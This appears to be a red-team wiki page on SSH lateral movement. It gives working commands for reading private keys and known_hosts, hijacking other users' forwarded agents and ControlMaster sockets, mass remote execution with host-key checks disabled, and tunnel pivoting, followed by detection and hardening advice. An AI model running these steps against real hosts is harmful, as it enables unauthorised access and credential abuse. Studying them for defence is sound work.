---
title: SSH exec / fan-out
slug: ssh-execution
---

> **TL;DR:** Reused SSH keys, agent-forwarded sockets, and `ControlMaster` multiplexing turn one compromised Linux box into authenticated remote exec on every host that trusts it — the Linux equivalent of pass-the-hash fan-out.

## What it is
SSH lateral movement leans on three properties: private keys in `~/.ssh/id_*` rarely rotate and are commonly copied across servers; `known_hosts` reveals which other hosts the user has logged into; and `ControlMaster` sockets in `~/.ssh/cm-*` let you piggy-back on an already-authenticated session without re-prompting for credentials or triggering MFA. Together these are the highest-yield, lowest-noise pivoting primitive on Linux estates. Combine with [[socks-proxies]] (`ssh -D`) for full network pivot.

## Preconditions / where it applies
- A shell on a Linux/macOS box (any non-nologin user).
- Readable private keys, an `SSH_AUTH_SOCK` from a forwarded agent, or an open `ControlMaster` socket.
- Network reachability to candidate next-hop targets on 22/tcp (or whatever port `~/.ssh/config` specifies).
- Targets that trust the harvested key or share the agent.

## Technique
Enumerate the pivot surface:

```
ls -la ~/.ssh/                        # id_*, config, known_hosts, cm-*
cat ~/.ssh/known_hosts                # historic targets (hashed unless HashKnownHosts=no)
ssh-keyscan -t rsa $(awk '{print $1}' ~/.ssh/known_hosts) 2>/dev/null
env | grep SSH_AUTH_SOCK              # forwarded agent?
ls /tmp/ssh-* 2>/dev/null             # agent sockets from other users
```

Hijack an existing multiplexed session (no auth, no MFA):

```
ssh -S ~/.ssh/cm-user@host:22 user@host    # rides the open master
```

Hijack a forwarded agent (if you can read another user's `SSH_AUTH_SOCK`, typically as root):

```
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh user@nexthop
```

Fan-out with `pdsh`/`parallel-ssh`/`xargs` once a key is validated:

```
for h in $(cat hosts); do ssh -o StrictHostKeyChecking=no -i id_rsa "$h" id; done
```

Watch out for `command=` restrictions in `authorized_keys` and `ForceCommand` in `sshd_config` — they limit what the key can do.

When pivoting with `ssh -R` to expose an internal service back through the foothold, remember that the remote bind defaults to `127.0.0.1` on the SSH server side — your attack-box tools won't reach it unless `sshd_config` has `GatewayPorts yes` (or `clientspecified`) and you bind explicitly with `ssh -R 0.0.0.0:5555:internal:445`. Most hardened estates leave `GatewayPorts no`, so prefer `-D` dynamic forwarding (which only needs an outbound socket on the foothold) for SOCKS-style pivoting and reserve `-R` for situations where the foothold is dual-homed and the operator box is firewalled off.

## Detection and defence
- `auth.log` / `journalctl -u ssh` shows `Accepted publickey` from unusual source IPs for the same key fingerprint across many hosts in a short window.
- Agent-forwarding abuse leaves no auth event on the source host beyond the original login — hunt via process tree (`ssh` children of unexpected parents) and socket access auditing (`auditd` on `/tmp/ssh-*`).
- Defences: per-host keys (no copies), `IdentitiesOnly=yes`, disable agent forwarding by default, `MaxSessions 1` to break ControlMaster reuse, enforce hardware-backed keys with PIN, log `sshd` with `LogLevel VERBOSE` to capture key fingerprints.

## References
- [SSH lateral movement — HackTricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) — agent / config abuse.
- [The Hacker Recipes — SSH](https://www.thehacker.recipes/) — ControlMaster hijack notes.
- [OpenSSH manual — ssh_config](https://man.openbsd.org/ssh_config) — ControlMaster, ForwardAgent, IdentitiesOnly.
- [ired.team — SSH tunnelling / port forwarding](https://www.ired.team/offensive-security/lateral-movement/ssh-tunnelling-port-forwarding) — `-L`/`-R`/`-D` mechanics and `GatewayPorts` binding nuance.

See also: [[ssh-agent-hijack]], [[cve-2024-6387-regresshion-openssh]]
